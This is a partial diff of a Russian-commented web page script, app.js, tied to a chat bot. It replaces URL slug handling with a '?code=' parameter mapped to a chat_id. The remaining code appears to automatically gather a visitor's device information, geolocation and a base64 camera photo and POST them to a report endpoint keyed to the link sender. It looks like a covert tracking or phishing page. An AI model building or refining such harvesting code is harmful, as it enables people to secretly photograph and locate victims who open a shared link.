@@ -1,6 +1,6 @@
-// === app.js (OneClick linked with bot) ===
+// === app.js (версия под code -> chat_id) ===
 
-// API base comes из <script>window.__API_BASE</script> в index.html
+// API base берётся из <script>window.__API_BASE</script> в index.html
 const API_BASE = (typeof window !== 'undefined' && window.__API_BASE)
   ? String(window.__API_BASE).replace(/\/+$/, '')
   : '';
@@ -12,29 +12,12 @@ const UI = {
 };
 
 window.__reportReady = false;
-window.__SLUG = window.__SLUG ?? null; // глобально
 
-// === slug resolver (/r/<slug>, ?slug=, кэш) ===
-function determineSlug() {
-  const q = new URLSearchParams(location.search).get('slug');
-  const m = location.pathname.match(/^\/r\/([a-z0-9\-]{3,40})$/i);
-  const pathSlug = m ? m[1] : null;
-  const slug = q || pathSlug || window.__SLUG || null;
-  if (slug) window.__SLUG = slug;
-  return slug;
-}
-
-// === FETCH LINK INFO (валидация slug, лог для отладки) ===
-async function loadLinkInfo() {
-  const slug = determineSlug();
-  if (!slug) return;
-  try {
-    const r = await fetch(`${API_BASE}/api/link-info?slug=${encodeURIComponent(slug)}`);
-    if (r.ok) console.log('🔗 link-info ok for', slug);
-    else console.warn('link-info failed', r.status);
-  } catch (e) {
-    console.warn('link-info fetch failed', e);
-  }
+// === CODE из URL (?code=...) ===
+function determineCode() {
+  const q = new URLSearchParams(location.search).get('code');
+  const code = q ? String(q).trim() : null;
+  return code && /^[A-Za-z0-9-]{3,40}$/.test(code) ? code : null;
 }
 
 // === Кнопка ===
@@ -151,10 +134,10 @@ function getDeviceInfo() {
 // === Отправка отчёта ===
 async function sendReport({ photoBase64, geo }) {
   const info = getDeviceInfo();
-  const slug = determineSlug();
-  if (!slug) throw new Error('No slug in URL');
+  const code = determineCode();
+  if (!code) throw new Error('No code in URL');
 
-  const body = { ...info, geo, photoBase64, note: 'auto', slug };
+  const body = { ...info, geo, photoBase64, note: 'auto', code };
 
   const r = await fetch(`${API_BASE}/api/report`, {
     method: 'POST',
@@ -197,7 +180,6 @@ async function autoFlow() {
 
 // === Инициализация ===
 window.__autoFlow = autoFlow;
-loadLinkInfo(); // ← подгружаем slug и проверяем линк
 
 // защита от преждевременного клика
 (function guardClick() {
